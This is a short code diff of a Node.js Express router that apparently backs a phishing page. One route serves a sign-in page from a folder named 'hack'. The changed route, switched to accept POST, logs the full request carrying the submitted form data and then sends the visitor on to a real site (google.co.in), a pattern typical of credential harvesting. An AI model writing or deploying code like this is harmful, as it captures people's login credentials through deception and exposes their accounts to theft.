@@ -12,7 +12,7 @@ router.get('/', function (req, res, next) {
   res.sendFile(__dirname + '/hack/signin.htm');
 });
 
-router.get('/signin/save', function (req, res, next) {
+router.post('/signin/save', function (req, res, next) {
 
   console.log(req);
   res.redirect('https://www.google.co.in');
